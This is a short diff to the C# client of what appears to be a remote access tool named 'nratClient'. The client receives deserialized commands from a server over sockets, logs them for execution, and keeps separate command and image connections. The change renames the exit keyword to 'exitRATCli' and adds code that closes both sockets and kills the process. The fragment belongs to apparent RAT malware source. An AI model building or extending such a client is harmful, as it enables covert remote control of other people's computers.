@@ -1,4 +1,5 @@
 ﻿using System;
+using System.Diagnostics;
 using System.Drawing;
 using System.Drawing.Imaging;
 using System.Net.Sockets;
@@ -78,7 +79,7 @@ namespace nratClient
 
                     outToServer = (String)binFormatterSend.Deserialize(stream);
                     Console.WriteLine("#EXEC: execute cmd: " + outToServer);
-                    if (outToServer.Contains("exitCli"))
+                    if (outToServer.Contains("exitRATCli"))
                     {
                         loopControl = false;
                     }
@@ -97,7 +98,14 @@ namespace nratClient
                 }
             }
             Console.WriteLine("ListenFromServer finish");
+
+            /* ############### TEMPORARY ################# */
             myTimer.Stop();
+            clientCMD.Close();
+            clientIMG.Close();
+            Process.GetCurrentProcess().Kill();
+            /* ########################################### */
+
             return;
         }
 
